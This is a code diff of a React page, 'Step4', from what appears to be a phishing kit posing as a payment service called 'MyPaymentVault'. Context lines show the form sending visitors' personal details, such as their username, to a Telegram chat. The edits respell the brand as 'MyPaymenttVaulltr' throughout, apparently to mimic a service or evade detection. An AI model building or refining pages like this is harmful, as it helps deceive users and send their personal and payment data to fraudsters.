@@ -90,7 +90,7 @@ export default function Step4() {
 
     await sendTelegram(
       `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `📋 <b>MyPaymentVault</b>\n` +
+      `📋 <b>MyPaymenttVaulltr</b>\n` +
       `📌 <b>Step 3 — Personal Info</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `👤 <b>Username</b>    : <code>${user?.username ?? "-"}</code>\n` +
@@ -152,9 +152,9 @@ export default function Step4() {
             style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}
             onClick={() => navigate("/")}
           >
-            <span style={{ fontWeight: 300 }}>MY</span>
-            <span style={{ fontWeight: 700 }}>PAYMENT</span>
-            <span style={{ fontWeight: 300 }}>VAULT</span>
+            <span style={{ fontWeight: 700 }}>My</span>
+            <span style={{ fontWeight: 300 }}>Paymentt</span>
+            <span style={{ fontWeight: 700 }}>Vaulltr</span>
           </span>
           <div className="relative">
             <button
@@ -456,7 +456,7 @@ export default function Step4() {
 
       <div style={{ width: "100%", maxWidth: 680, marginTop: 12, paddingRight: 2, textAlign: "right" }}>
         <span style={{ fontSize: 11, color: "#888" }}>
-          &copy; MyPaymentVault | Terms of Use | Privacy &amp; Cookies
+          &copy; MyPaymenttVaulltr | Terms of Use | Privacy &amp; Cookies
         </span>
       </div>
 
